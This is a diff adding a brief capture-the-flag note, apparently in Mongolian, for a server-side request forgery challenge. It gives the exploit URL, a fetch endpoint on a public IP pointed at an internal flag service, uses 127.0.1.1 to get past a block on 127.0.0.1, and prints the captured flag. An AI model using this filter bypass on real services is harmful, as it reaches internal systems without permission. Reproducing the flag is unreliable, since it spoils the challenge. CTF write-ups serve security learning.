@@ -1,0 +1,4 @@
+1. http://139.162.5.230:10071/fetch?url=http://127.0.1.1:9009/flag ees flag aa avna.
+    127.0.0.1 bolku bvl 127.0.1.1 luun shaa :)
+
+flag : HZU18{DNS_1S_S0_FUN}
